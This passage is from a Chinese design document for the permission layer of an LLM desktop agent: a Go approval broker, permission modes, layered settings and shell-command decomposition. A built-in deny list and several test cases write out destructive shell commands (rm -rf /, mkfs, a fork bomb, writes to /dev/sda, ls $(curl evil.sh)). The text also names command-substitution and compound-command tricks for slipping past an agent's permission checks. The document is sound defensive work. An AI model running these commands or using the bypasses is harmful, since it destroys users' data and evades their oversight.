// requestID 对应 permission_request 事件中的 requestId；
// decision ∈ allow | deny；scope ∈ once | session | always
func (a *App) ResolvePermission(requestID string, decision string, scope string) error {
	return a.permBroker.Resolve(requestID, decision, scope)
}
```

Go 侧 broker（带锁 + 超时）：

```go
type permissionBroker struct {
	mu      sync.Mutex
	pending map[string]chan PermissionDecision
	timeout time.Duration // 默认 5 分钟
}

func (b *permissionBroker) Ask(ctx context.Context, req PermissionRequest) (PermissionDecision, error) {
	ch := make(chan PermissionDecision, 1) // 缓冲 1，避免应答方阻塞
	b.mu.Lock()
	b.pending[req.RequestID] = ch
	b.mu.Unlock()
	defer func() {
		b.mu.Lock()
		delete(b.pending, req.RequestID)
		b.mu.Unlock()
	}()

	// 发事件给前端
	wailsRuntime.EventsEmit(aCtx, "chat:event", ChatEvent{
		Type: "permission_request", Permission: &req,
	})

	select {
	case d := <-ch:
		return d, nil
	case <-time.After(b.timeout):
		return PermissionDecision{}, fmt.Errorf("等待用户授权超时") // → 拒绝
	case <-ctx.Done():
		return PermissionDecision{}, ctx.Err() // 用户取消整个会话 → 拒绝
	}
}
```

三个 select 分支缺一不可：**超时**与**取消**都必须能打断等待，否则一次无人应答的询问会永久挂住后端 goroutine。

前端侧（`api/session.js` 的 `chat()` handler 加一个 case）：

```js
case 'permission_request':
  onPermissionRequest?.(eventData.permission)
  break
```

再由 `stores/permissions.js`（新增）维护待答队列，`ChatPane.vue` 挂载的弹窗组件消费该队列。

### 5.4.3 事件时序

```
chat.go:549      emit tool_call_start            → 前端显示「工具调用中」卡片
                 guardedTool.Execute
                   └─ 决策 = 询问
                      emit permission_request     → 前端弹窗
                      阻塞等待 …（超时 5min / ctx 取消）
前端弹窗作答  →  ResolvePermission(requestId, allow, session)
                      ← chan 收到 → 继续
决策 = 放行       →  inner.Execute(ctx, args)      → 真实执行
chat.go:573      emit tool_call_end              → 前端卡片转为成功/失败
```

若被拒绝，`ExecuteTool` 返回 error，`chat.go:559-563` 自动写成 `执行失败: 操作被权限策略拒绝：…` 并作为 `role=tool` 消息回填，**LLM 会看到拒绝原因并调整策略**——这条路径完全复用现状，无需改动。

### 5.5 权限模式映射到本项目的工具形态

Claude Code 的模式是按它的工具集（Bash / Read / Edit / WebFetch）设计的；local-agent 的工具是**配置驱动**的（`builtin`/`cli`/`api`/`mcp`），因此模式语义要落到 `RiskClass` 上：

| 模式 | 对本项目的含义 |
| --- | --- |
| `default` | 只读（`read_skill`）放行；`write`/`network`/`process` 未匹配规则则询问 |
| `acceptEdits` | 额外自动放行「被识别为文件编辑」的写操作。**注意**：本项目无专用文件编辑工具，该模式主要作用于 `exec_shell` 中的 `mv/cp/mkdir/touch/sed` 等命令，价值有限 |
| `plan` | 只读模式：`read_skill` 与 `list/describe` 可放行，其余一律拒绝 |
| `bypassPermissions` | 全放行，但 deny 规则仍生效 |

**建议**：P0 只实现 `default` / `plan` / `bypassPermissions` 三个，`acceptEdits` 延后到 P2。理由是它在当前工具集下几乎没有实际收益，反而增加「哪些算文件编辑」的判定复杂度。

**不实现 `auto` 与 `dontAsk` 的理由**：`auto` 需要引入额外的模型调用做安全分类，会显著增加每次工具调用的延迟与成本，且其判定本身不可审计；`dontAsk` 在本项目的交互形态下收益很低（用户更可能直接选 `plan`）。

### 5.6 配置分层与存储

| 层 | 路径 | 内容 | 说明 |
| --- | --- | --- | --- |
| 内置默认 | 代码内 `defaultRuleSet()` | 危险命令 deny 名单 | 不可被用户撤销的部分见 R2 |
| 用户全局 | `~/.local-agent/settings.json` | allow/ask/deny、defaultMode | **新增 Go 侧 settings store**（缺口 N3） |
| 项目级 | `<projectDir>/.local-agent/settings.json` | 同上 | 可提交版本控制，团队共享 |
| 项目本地 | `<projectDir>/.local-agent/settings.local.json` | 「总是允许」写这里 | 不提交，随项目 |
| 会话级 | 内存 `GrantStore` | 「本次会话允许」 | 会话结束失效 |

项目目录解析直接复用 `app.go:346 resolveProjectDir(sessionID)`。

合并规则（对齐 3.5 的经验）：

- `allow` / `ask` / `deny` 三个列表**跨层合并**
- `defaultMode` 等标量**高层覆盖低层**
- 每条规则携带 `Source` 字段，供界面与审计追溯

内置默认 deny 名单（`Source = "builtin"`，用户不可删，只能看到）：

```
exec_shell(rm -rf /:*)        exec_shell(rm -rf /*:*)
exec_shell(rm -rf ~:*)        exec_shell(mkfs:*)
exec_shell(dd if=:*)          exec_shell(:(){ :|:& };:)
exec_shell(chmod -R 777 /:*)  exec_shell(> /dev/sda:*)
exec_shell(shutdown:*)        exec_shell(reboot:*)
```

> 说明：该名单依赖 5.7 的命令分解能力才可靠（否则 `rm -rf /` 可以藏在 `&&` 之后）。P0 阶段先按「整条命令前缀匹配」，P2 随命令分解一起强化。

### 5.7 命令分解与替换检测（P2）

这是针对 3.8「命令替换绕过」与「复合命令绕过」的专项设计，是**本方案相对朴素复刻 Claude Code 的核心增值点**。

```go
type CommandAnalysis struct {
	Segments        []string // 分解后的子命令
	HasSubstitution bool     // 含 $(...) 或 `...`
	HasRedirection  bool     // 含 > >> < <<
	HasPipe         bool
	Uncertain       bool     // 引号未闭合等解析不确定
	Reason          string
}

func AnalyzeCommand(cmd string) CommandAnalysis
```

判定策略：

| 情形 | 策略 |
| --- | --- |
| `Uncertain`（引号未闭合、嵌套过深） | **强制询问**，且 allow 规则不得静默放行 |
| `HasSubstitution` | **强制询问**（对齐 Claude Code 对 `$(...)` 的处置），因为替换结果的命令无法静态判定 |
| 分解成功 | **逐段判定**：任一段 deny → 整条 deny；任一段需 ask → 整条 ask；全部 allow → 放行 |
| 段数 > 32 | 直接询问（避免「段数过多导致检查被绕过」这一类问题） |

实现上做一个保守的 tokenizer：扫描引号状态，在**未被引号包裹**的 `&&` `||` `;` `|` 换行处切分。**不追求 shell 语法完备**——遇到不确定就交给询问，这正是 1.2 中 G8 与设计原则 1 的落点。

### 5.8 前端 UI

| 组件 | 类型 | 职责 |
| --- | --- | --- |
| `components/business/PermissionDialog.vue` | 新增 | 授权弹窗，照 `ToolEditDialog.vue` 的 `props.visible` + `watch` 范式 |
| `stores/permissions.js` | 新增 | 待答请求队列 + 当前请求 |
| `panes/ChatPane.vue` | 改 | 挂载弹窗，注册 `onPermissionRequest` 回调 |
| `components/business/ToolCallCard.vue` | 改 | `status` 增加 `pending`（等待授权）/ `denied`（被拒）两个分支与配色 |
| `api/session.js` | 改 | handler 增加 `permission_request` case |
| `api/permission.js` | 新增 | Wails / 浏览器 mock 双模式（对齐 `api/tool.js` 范式） |
| `views/Settings.vue` | 改 | 新增「权限配置」tab（规则查看/编辑、默认模式） |
| `stores/setting.js` | 改 | 若保留前端设置，需与后端 settings 同步 |

弹窗形态（三个按钮对应三种授权范围）：

```
┌──────────────────────────────────────────────────────┐
│  ⚠ 需要授权                                          │
├──────────────────────────────────────────────────────┤
│  工具   终端命令 (exec_shell)                          │
│  风险   修改本机状态                                   │
│                                                       │
│  命令   rm -rf ./build                                │
│                                                       │
│  ▸ 查看完整参数                                        │
├──────────────────────────────────────────────────────┤
│  [ 拒绝 ]  [ 仅本次允许 ]  [ 本会话允许 ]  [ 永久允许 ▾ ]│
└──────────────────────────────────────────────────────┘
```

「永久允许」需二次确认，并明确告知写入的目标文件（`<项目>/.local-agent/settings.local.json`）——对齐 3.6 的持久化区分：**命令类可持久化，文件编辑类只给「本会话允许」**。

---

## 六、边界情况与风险清单

| 编号 | 风险 / 场景 | 处理策略 |
| --- | --- | --- |
| R1 | 无人应答（前端已关闭/崩溃） | broker 超时（默认 5 分钟）→ 拒绝；且 `ctx.Done()` 可打断 |
| R2 | 用户把自己锁死（deny 全部工具） | 内置默认 deny 不提供 UI 撤销，但用户自定义规则可全删；建议在设置页提供「恢复默认」 |
| R3 | **MCP stdio 在装配阶段拉子进程**（`toolruntime.go:212-220`），不经工具通道 | 本期列为**已知缺口**：在设置页「测试连接/启用 MCP」时做一次性授权告警；不宣称覆盖 |
| R4 | 规则语法写错 | 解析失败不阻断启动，标记错误规则并在设置页展示（对齐 `skills.go` 对错误技能的处理） |
| R5 | 单测直接调 `ExecuteTool`，无前端可应答 | `BuildView(ctx, nil, ...)` 直通；新增测试用 fake `Asker` 注入固定答案 |
| R6 | 并发工具调用同时请求授权 | broker 以 `requestId` 为键，天然支持多请求排队；弹窗按队列逐个处理 |
| R7 | 会话切换时残留未答请求 | 切会话/取消时按会话清理 pending，并令其 ctx 取消 → 拒绝 |
| R8 | 工具在授权后执行超时/挂死 | **必须同时修 `CLITool` 的 ctx 与超时**（缺口 N4），否则授权后仍会永久挂住 |
| R9 | 浏览器 dev 模式行为分叉 | `api/permission.js` 与 `api/tool.js` 的 mock 必须同步（缺口 N5） |
| R10 | 模型反复尝试被拒操作 | 拒绝原因完整回填给 LLM；`MaxChatTurns=50`（`chat.go:114`）已是天然上限 |
| R11 | 规则跨层合并后 deny 无法撤销 | 有意为之（对齐 3.5）；界面必须展示规则来源，否则用户会困惑 |
| R12 | 命令分解被绕过（引号/转义畸形） | 保守 tokenizer + 不确定即询问；**不承诺完备**，沙箱是后续补充 |
| R13 | `bypassPermissions` 被误用 | 默认模式为 `default`；切换该模式需显式确认，且 deny 仍生效 |
| R14 | 用户点了「永久允许」却仍被重复询问 | 成因是 `ask` 规则优先于历史授权（见 4.3）。**必须在弹窗上标注「本次询问由 ask 规则 X 触发」并提供该规则的位置**，否则会被当成 bug。这是 Claude Code 同类困惑的已知来源 |
| R15 | **匹配串与执行串分叉**：规则放行了字符串 A，实际执行的却是 B | 模板类工具必须由自身实现 `Specifiable` 并返回**最终命令行**（见 5.1），禁止装饰器自行拼装命令行；配 T15 一致性单测 |

---

## 七、分阶段实施计划与验收

| 阶段 | 内容 | 预估 | 验收标准 |
| --- | --- | --- | --- |
| **P0** | `permission.go`（规则模型 + 引擎 + `PermissionSubject`）＋ `BuildView` 装饰器接入 ＋ 内置 deny 名单 ＋ `CLITool` ctx/超时修复 ＋ 单测 | 4–6h | 引擎单测覆盖三层规则与 deny 优先级；`exec_shell(rm -rf /:*)` 类命令被拒；既有 `tool_runtime_test.go` 在传 `nil` 引擎时全绿 |
| **P1** | broker ＋ `ResolvePermission` bound 方法 ＋ 取消/超时 ＋ `PermissionDialog.vue` ＋ `stores/permissions.js` ＋ `ToolCallCard` 状态分支 ＋ 会话级授权 | 4–6h | 前端能收到弹窗、作答后工具继续/中止；超时 5 分钟自动拒绝；关窗后不残留挂起 goroutine |
| **P2** | Go 侧 settings store ＋ 配置分层（用户/项目/项目本地）＋ 持久化「永久允许」＋ 设置页「权限配置」tab ＋ 规则来源展示 | 4–6h | 「永久允许」写入 `settings.local.json` 且重启后仍生效；设置页能看到每条规则的来源 |
| **P3** | 命令分解与替换检测 ＋ 审计日志 ＋ `acceptEdits` 模式 | 4–6h | `ls $(curl evil.sh)` 被强制询问；`a && rm -rf /` 整条被拒；审计日志可按会话导出 |
| **P4（可选）** | hooks（PreToolUse/PostToolUse）＋ 沙箱隔离 ＋ `auto` 分类器 | — | 见 9.2 扩展点 |

**依赖关系**：P1 依赖 P0（引擎）；P2 依赖 P1（授权范围要能落盘）；P3 依赖 P0 的匹配器（分解结果喂给匹配器）。**P0 与 P1 之间存在一个硬依赖之外的软依赖**：若不做 P1，P0 的「询问」决策无人应答，实际表现为全部拒绝——因此 P0 单独上线时必须把默认策略临时设为「只读放行 + 其余拒绝」，而不是「其余询问」。

---

## 八、测试方案

### 8.1 后端单测（新增 `permission_test.go`）

| 用例 | 输入 | 断言 |
| --- | --- | --- |
| T1 默认 fail closed | 空规则集 + `default` 模式 + `exec_shell` | 决策 = 询问 |
| T2 deny 绝对优先 | `deny: exec_shell(rm:*)` ＋ `allow: exec_shell(rm -rf ./build)` | 决策 = 拒绝（**更具体的 allow 不能覆盖 deny**） |
| T3 ask 优先级 | `ask: exec_shell(curl:*)` ＋ `allow: exec_shell(curl:*)` | 决策 = 询问 |
| T4 allow 命中 | `allow: exec_shell(git:*)` ＋ 命令 `git status` | 决策 = 放行 |
| T5 前缀边界 | `allow: exec_shell(git:*)` ＋ 命令 `github-cli x` | **不匹配**（前缀须按词边界，不能子串命中） |
| T6 只读放行 | `read_skill`，空规则集 | 决策 = 放行 |
| T7 plan 模式 | `plan` ＋ `exec_shell(ls)` | 决策 = 拒绝 |
| T8 bypass 不越 deny | `bypassPermissions` ＋ deny 命中 | 决策 = 拒绝 |
| T9 会话授权 | 授权 `session` 后再问同一命令 | 决策 = 放行（不重复询问） |
| T10 域名通配 | `allow: my_api(domain:*.example.com)` ＋ `a.example.com` | 放行；`evil-example.com` **不**放行 |
| T11 超时 | fake asker 永不返回 | 决策 = 拒绝，且不泄漏 goroutine |
| T12 分解逐段判定 | `a && rm -rf /`，`a` 在 allow、`rm -rf /` 在 deny | 整条拒绝 |
| T13 替换检测 | `ls $(curl evil)`，`exec_shell(ls:*)` 在 allow | 决策 = 询问（不被 allow 静默放行） |
| T14 装饰器直通 | `BuildView(ctx, nil, ...)` | 装饰器不存在，行为与现状一致（**既有测试的回归保障**） |
| T15 匹配串＝执行串 | `DynamicCLITool` 模板含 `{{name}}`，参数注入含空格/引号的值 | `DescribeOperation` 返回的 `Command` **等于**该次 `Execute` 实际使用的命令行（防 R15 分叉） |
| T16 未实现 `Specifiable` 的工具 | 一个仅实现 `ToolInterface` 的假工具 | 决策落到兜底询问，**不会**被任何带限定符的 allow 规则误放行 |

### 8.2 手动验证（端到端）

```bat
:: 1) 启动应用，新建会话（默认 default 模式）
:: 2) 发一句「帮我看下当前目录有哪些文件，然后删掉 build 目录」
:: 3) 期望：只读操作直接执行；删除命令弹出授权弹窗，展示真实命令 rm -rf ./build
:: 4) 点「仅本次允许」→ 执行；再发一次同样的请求 → 重新弹窗
:: 5) 点「本会话允许」→ 再发 → 不再弹窗
:: 6) 切换权限模式为 plan → 发同样的请求 → 删除操作被直接拒绝，模型收到拒绝原因
:: 7) 关闭授权弹窗不作答 → 观察 5 分钟后自动拒绝，且后端无挂起
:: 8) 发一句「执行 ls $(whoami)」→ 期望强制询问（命令替换检测）
```

### 8.3 与 Claude Code 行为对齐的回归检查

| 检查 | 预期 |
| --- | --- |
| 未匹配规则 | 询问，**绝不静默放行** |
| deny 与更具体 allow 冲突 | deny 胜出 |
| bypassPermissions 下 deny | 仍然拒绝 |
| 只读工具 | 不弹窗 |
| 授权范围 | 「永久允许」落盘；文件编辑类只给会话级 |
| 规则来源可追溯 | 每条规则能显示来自哪一层 |

---

## 九、附录

### 9.1 与 Claude Code 的能力对照

| 能力 | Claude Code | 本方案 | 说明 |
| --- | --- | --- | --- |
| allow / ask / deny 三层规则 | ✅ | ✅ | 对齐 |
| deny 绝对优先 | ✅ | ✅ | 对齐 |
| 兜底 fail closed | ✅ | ✅ | 对齐 |
| 规则含参数限定符 | ✅ | ✅ | 语法对齐，specifier 语义按本项目工具形态适配 |
| 权限模式 | 4 项 + 2 项【较新】 | 3 项（P0）+ 1 项（P3） | 不做 `auto` / `dontAsk`，理由见 5.5 |
| 配置分层与列表合并 | ✅ | ✅ | 对齐 |
| 授权分级（本次/会话/永久） | ✅ | ✅ | 对齐，并沿用「文件编辑不持久化」的区分 |
| 交互确认 | 终端内联 | 应用内弹窗 | 形态差异，因本项目是 GUI |
| 文件编辑授权仅会话有效 | ✅ | ✅ | 对齐 |
| 命令分解 / 替换检测 | 部分（存在已知绕过） | 显式专项设计 | **本方案的增值点** |
| 域名通配 | ❌ 不支持 | ✅ 支持 | 有意修复其缺陷 |
| `/permissions` 可视化 | ✅ | ✅（P2） | 对齐 |
| PreToolUse / PostToolUse hooks | ✅ | ⏸ 仅预留扩展点 | 见 9.2 |
| OS 级沙箱 | ✅ | ⏸ 本期不做 | 见 9.2 |
| AI 分类器自动审批 | ✅【较新】 | ⏸ 不做 | 延迟与成本，且判定不可审计 |

### 9.2 后续扩展点（本期不做，但架构需预留）

1. **Hooks**：`PermissionEngine` 已把决策收敛到单一函数 `Authorize`。后续可在其最前面插入 `PreToolUse` 钩子链，语义为「只能收紧不能放宽」——即 hook 返回 deny 时直接拒绝，返回 allow 时不跳过 deny 规则。
2. **沙箱**：`RiskClass` 与 `PermissionSubject` 已描述「这是什么操作」，可作为沙箱策略的输入。沙箱落地后，`plan` 模式可退化为「沙箱内只读」，安全性由内核保证而非解析正确性。
3. **`auto` 分类器**：可在决策管线第 9 步（兜底询问）之前插入，仅对 `RiskClass` 较低的操作尝试自动批准。

### 9.3 改动文件清单

**后端（新增）**

| 文件 | 内容 |
| --- | --- |
| `permission.go` | 规则模型、匹配引擎、`PermissionSubject`、broker、`Asker` 接口、审计 |
| `permission_test.go` | 8.1 的测试用例 |
| `settings.go` | Go 侧全局/项目 settings store（P2） |

**后端（修改）**

| 文件 | 改动 |
| --- | --- |
| `tools.go` | `BuildView` 签名加 `eng` 参数 + 装配处 `wrap()`；`CLITool.Execute` 补 ctx 与超时 |
| `chat.go` | `chat.go:482` 传入引擎；`ChatEvent` 增 `Permission` 字段；引入可取消 ctx |
| `app.go` | 新增 `ResolvePermission` / `CancelChat` bound 方法；`startup` 初始化引擎与 broker |
| `toolstore.go` | `ToolConfig` 增 `Risk` / `RequiresApproval` 字段（可选，缺省由类型推导） |
| `toolruntime.go` | `DynamicCLITool` 的渲染结果需能产出 `Command` 供匹配 |

**前端（新增）**

| 文件 | 内容 |
| --- | --- |
| `components/business/PermissionDialog.vue` | 授权弹窗 |
| `stores/permissions.js` | 待答队列 |
| `api/permission.js` | 双模式 API（含浏览器 mock） |

**前端（修改）**

| 文件 | 改动 |
| --- | --- |
| `api/session.js` | handler 增 `permission_request` case |
| `panes/ChatPane.vue` | 注册回调 + 挂载弹窗 |
| `components/business/ToolCallCard.vue` | 增 `pending` / `denied` 状态 |
| `views/Settings.vue` | 新增「权限配置」tab |
| `stores/setting.js` | 与后端 settings 同步（P2） |
| `types/index.js` | 增补 `PermissionMode` / `PermissionRequest` / `Rule` 的 JSDoc |

### 9.4 术语

| 术语 | 含义 |
| --- | --- |
| **Subject（判定对象）** | 归一化后的待判定操作，规则匹配的唯一输入 |
| **Gate（闸门）** | 决策入口，即 `PermissionEngine.Authorize` |
| **Broker（中转）** | 后端↔前端授权询问的等待/应答组件 |
| **Grant（授权）** | 用户对某类操作的放行许可，分 once / session / always |
| **RiskClass（风险级别）** | 工具操作的分类：read / write / network / process |
| **fail closed** | 不确定时默认拒绝或询问，绝不静默放行 |
